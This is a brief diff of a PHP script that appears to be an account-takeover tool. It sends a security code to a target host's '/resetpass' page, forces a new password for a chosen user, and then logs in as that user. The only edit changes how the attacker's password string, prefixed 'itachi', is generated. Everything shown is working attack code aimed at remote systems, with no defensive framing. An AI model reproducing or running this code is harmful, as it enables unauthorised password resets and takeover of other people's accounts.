@@ -142,7 +142,7 @@ if(isset($g2) && $codeSC != ""){
 	}
 	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
 	$injCode = CurlPage("$ip/resetpass",$postCode);
-	$newpass = "itachi#".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),5)."anon";
+	$newpass = "itachi".substr(str_shuffle("abcdefSTUVWXYZ"),5);
 	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
 	$injPassword = CurlPage("$ip/resetpass",$postPassword);
 	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
